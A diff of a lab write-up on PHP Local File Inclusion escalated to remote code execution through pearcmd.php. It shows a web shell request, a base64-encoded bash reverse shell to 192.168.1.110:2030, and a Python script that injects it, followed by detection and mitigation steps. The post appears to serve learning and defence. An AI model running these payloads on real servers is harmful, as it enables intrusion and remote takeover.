@@ -1,7 +1,7 @@
 # PHP <= 7.3 Local File Inclusion with RCE (PoC)
 
 
-This post aims to acquire knowledge about exploiting vulnerabilities in web systems. In this instance, I will delve into an LFI (Local File Inclusion) vulnerability and an RCE (Remote Code Execution) vulnerability. I will utilize the tools within the 'pearcmd.php' file to craft manipulated files. Within a web environment, we can leverage the functionalities of 'pearcmd' by controlling command-line parameters. This Proof of Concept (PoC) is highly specialized, yet it serves as an opportunity for me to explore new methods of penetration within web environments.
+In this instance, I will delve into an LFI (Local File Inclusion) vulnerability and an RCE (Remote Code Execution) vulnerability. I will utilize the tools within the 'pearcmd.php' file to craft manipulated files. Within a web environment, we can leverage the functionalities of 'pearcmd' by controlling command-line parameters. This Proof of Concept (PoC) is highly specialized, yet it serves as an opportunity for me to explore new methods of penetration within web environments.
 
 # Summary
 
@@ -28,7 +28,7 @@ This post introduces a highly focused Proof of Concept (PoC), designed to push t
 
 # Environment Setup
 
-The test environment will be created within a CT (Container) in Proxmox by installing PHP through Docker. This approach simplifies the setup of a testing environment, specifically with PHP version 7. However, it's important to note that for this environment to function as intended, there must exist a pre-existing vulnerability related to Local File Inclusion (LFI). This vulnerability is the key to our exploration and allows us to demonstrate and understand the exploitation of LFI and RCE vulnerabilities effectively.
+The test environment will be created within a CT (Container) in Proxmox by installing PHP through Docker. This approach simplifies the setup of a testing environment, specifically with PHP version 7. However, it's important to note that for this environment to work as intended, there must exist a pre-existing vulnerability related to Local File Inclusion (LFI). This vulnerability is the key to our exploration and allows us to demonstrate and understand the exploitation of LFI and RCE vulnerabilities effectively.
 
 ## Docker
 
@@ -148,7 +148,7 @@ URL: `http://192.168.1.202:8080/index.php?file=/tmp/h4ndsh.php&cmd=id`
 
 # Reverse Shell
 
-In a scenario where a server allows the injection of Unix commands, such as through vulnerabilities like Local File Inclusion (LFI) or Remote Code Execution (RCE), it becomes possible to send a specific command to establish a reverse shell. A reverse shell is a connection initiated from the compromised server to the attacker's machine, providing the attacker with control over the server. To achieve this, I modify a previously used Python3 script to inject a command that opens a reverse shell on their own computer. For ease of use, the reverse shell command is encoded in base64, with the IP address "192.168.1.110" and port "2030" specified as the connection destination.
+In a scenario where a server allows the injection of Unix commands, such as through vulnerabilities like Local File Inclusion (LFI) or Remote Code Execution (RCE), it becomes possible to send a specific command to establish a reverse shell. A reverse shell is a connection initiated from the compromised server to the attacker's machine, providing the attacker with control over the server. To achieve this, I modified a previously used Python3 script to inject a command that opens a reverse shell on their own computer. For ease of use, the reverse shell command is encoded in base64, with the IP address "192.168.1.110" and port "2030" specified as the connection destination.
 
 ```bash
 echo 'bash -c "sh -i >& /dev/tcp/192.168.1.110/2030 0>&1"' | base64 -w 0
@@ -164,7 +164,7 @@ conn.request("GET", f"/index.php?file=/tmp/h4ndsh.php&cmd=echo+{cmd}|base64+-d|b
 conn.close()
 ```
 
-This code only injects our console line into our `cmd` parameter created previously. Remembering that the file to which the commands are being written and interpreted in PHP, we have to add "echo cmd | base64 -d | bash" so that it is decoded (-d) and to be executed.
+This code only injects our console line into our `cmd` parameter created previously. Remembering that the file to which the commands are being written and interpreted is a PHP file, we have to add "echo cmd | base64 -d | bash" so that it can be decoded (-d) and executed.
 
 The complete code would look like this:
 
@@ -254,6 +254,12 @@ nuclei -u <target> -t argv.yaml -nc -silent
 
 ```bash
 echo "register_argc_argv = Off" > /usr/local/etc/php/php.ini
+```
+Docker command:
+
+```bash
+docker exec -it <CONTAINER ID> sh -c 'echo "register_argc_argv = Off" > /usr/local/etc/php/php.ini'
+docker restart <CONTAINER ID>
 ```
 
 ![Mitigation](mitigation.png "Mitigation")
